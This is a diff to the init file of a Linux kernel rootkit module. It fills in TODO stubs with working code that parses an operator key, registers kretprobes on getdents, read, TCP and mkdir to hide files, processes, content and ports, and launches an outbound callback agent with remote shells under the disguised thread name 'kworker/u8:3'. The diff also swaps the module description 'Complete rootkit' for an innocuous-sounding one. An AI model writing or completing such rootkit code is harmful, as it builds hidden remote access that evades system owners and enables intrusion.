@@ -1,87 +1,127 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Complete rootkit: module lifecycle with goto-rollback init.
-//
-// Parses the hex key, sets up AEAD crypto, initializes target lists,
-// registers hiding kretprobes, and spawns the callback agent thread.
-// No socket is created here; the agent connects outbound on its own.
-//
+// core/init.c - Module init: key parsing, probe registration, agent launch.
 #include <linux/hex.h>
 #include <linux/init.h>
+#include <linux/kernel.h>
 #include <linux/kthread.h>
-#include <linux/random.h>
+#include <linux/module.h>
+#include <linux/string.h>
 
 #include "rootkit.h"
 
-// TODO: Declare all 6 module parameters:
-//   control_key (charp): hex-encoded 256-bit key
-//   peer_port (ushort): operator port, default 4444
-//   peer_address (charp): operator IP, default "127.0.0.1"
-//   retry_base_ms (uint): initial retry delay, default 1000
-//   retry_max_ms (uint): max retry delay, default 60000
-//   shell_timeout_ms (uint): shell command timeout, default 30000
-static char *control_key;
-module_param(control_key, charp, 0);
+// Module parameters
+unsigned short peer_port;
+module_param(peer_port, ushort, 0);
 
-unsigned short rk_peer_port = 4444;
-module_param_named(peer_port, rk_peer_port, ushort, 0);
+char peer_addr_str[16] = "127.0.0.1";
+module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);
 
-char *rk_peer_address = "127.0.0.1";
-module_param_named(peer_address, rk_peer_address, charp, 0);
+static char rk_key_hex[RK_KEY_HEX_LEN + 1];
+module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);
 
-unsigned int rk_retry_base_ms = 1000;
-module_param_named(retry_base_ms, rk_retry_base_ms, uint, 0);
+unsigned int retry_base_ms = 5000;
+module_param(retry_base_ms, uint, 0);
 
-unsigned int rk_retry_max_ms = 60000;
-module_param_named(retry_max_ms, rk_retry_max_ms, uint, 0);
+unsigned int retry_max_ms = 60000;
+module_param(retry_max_ms, uint, 0);
 
-unsigned int rk_shell_timeout_ms = 30000;
-module_param_named(shell_timeout_ms, rk_shell_timeout_ms, uint, 0);
+unsigned int shell_timeout_ms = 60000;
+module_param(shell_timeout_ms, uint, 0);
 
-// Shared AEAD transform
-struct crypto_aead *rk_tfm;
+u8 rk_key[RK_KEY_LEN];
 
-// Key material
-static u8 rk_key[RK_KEY_LEN];
-
-// Agent kthread handle
 static struct task_struct *rk_thread;
-
-static int rk_parse_key(void)
-{
-	// TODO: Validate control_key length is RK_KEY_HEX_LEN,
-	// hex2bin into rk_key, then memzero_explicit the parameter.
-	return -ENOSYS;
-}
 
 static int __init rk_init(void)
 {
-	// TODO: Complete init with goto-rollback chain:
-	//
-	// 1. rk_parse_key()
-	// 2. crypto_alloc_aead("gcm(aes)", 0, 0)
-	// 3. crypto_aead_setkey(rk_tfm, rk_key, RK_KEY_LEN)
-	// 4. crypto_aead_setauthsize(rk_tfm, RK_TAG_LEN)
-	// 5. Zero the raw key copy (it is baked into the TFM now)
-	// 6. Initialize all 4 target lists
-	// 7. rk_filter_init() to register hiding kretprobes
-	// 8. kthread_run(rk_agent_thread, ..., "kworker/u8:3")
-	//
-	// Goto labels: fail_filter, fail_tfm, fail_key
-	return -ENOSYS;
+	int ret;
+
+	if (!peer_port)
+		return -EINVAL;
+	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
+		return -EINVAL;
+	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
+		return -EINVAL;
+
+	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));
+
+	rk_target_init(&rk_file_targets);
+	rk_target_init(&rk_pid_targets);
+	rk_target_init(&rk_content_targets);
+	rk_target_init(&rk_port_targets);
+	rk_shells_init();
+
+	ret = register_kretprobe(&rk_getdents_probe);
+	if (ret)
+		goto fail_getdents;
+
+	ret = register_kretprobe(&rk_read_probe);
+	if (ret)
+		goto fail_read;
+
+	ret = register_kretprobe(&rk_tcp4_probe);
+	if (ret)
+		goto fail_tcp4;
+
+	ret = register_kretprobe(&rk_tcp6_probe);
+	if (ret)
+		goto fail_tcp6;
+
+	ret = register_kretprobe(&rk_mkdir_probe);
+	if (ret)
+		goto fail_mkdir;
+
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret)
+		goto fail_mkdirat;
+
+	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
+	if (IS_ERR(rk_thread)) {
+		ret = PTR_ERR(rk_thread);
+		rk_thread = NULL;
+		goto fail_thread;
+	}
+
+	return 0;
+
+fail_thread:
+	unregister_kretprobe(&rk_mkdirat_probe);
+fail_mkdirat:
+	unregister_kretprobe(&rk_mkdir_probe);
+fail_mkdir:
+	unregister_kretprobe(&rk_tcp6_probe);
+fail_tcp6:
+	unregister_kretprobe(&rk_tcp4_probe);
+fail_tcp4:
+	unregister_kretprobe(&rk_read_probe);
+fail_read:
+	unregister_kretprobe(&rk_getdents_probe);
+fail_getdents:
+	rk_shells_cleanup();
+	memzero_explicit(rk_key, sizeof(rk_key));
+	return ret;
 }
 
 static void __exit rk_exit(void)
 {
-	// TODO: Reverse of init:
-	// 1. rk_uncloak_module()
-	// 2. kthread_stop(rk_thread)
-	// 3. rk_filter_cleanup()
-	// 4. crypto_free_aead(rk_tfm)
-	// 5. memzero_explicit(rk_key)
+	if (rk_thread)
+		kthread_stop(rk_thread);
+
+	rk_uncloak();
+
+	unregister_kretprobe(&rk_mkdirat_probe);
+	unregister_kretprobe(&rk_mkdir_probe);
+	unregister_kretprobe(&rk_tcp6_probe);
+	unregister_kretprobe(&rk_tcp4_probe);
+	unregister_kretprobe(&rk_read_probe);
+	unregister_kretprobe(&rk_getdents_probe);
+
+	rk_shells_cleanup();
+	memzero_explicit(rk_key, sizeof(rk_key));
 }
 
 module_init(rk_init);
 module_exit(rk_exit);
+
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Complete rootkit");
+MODULE_DESCRIPTION("Remote control protocol over encrypted channel");
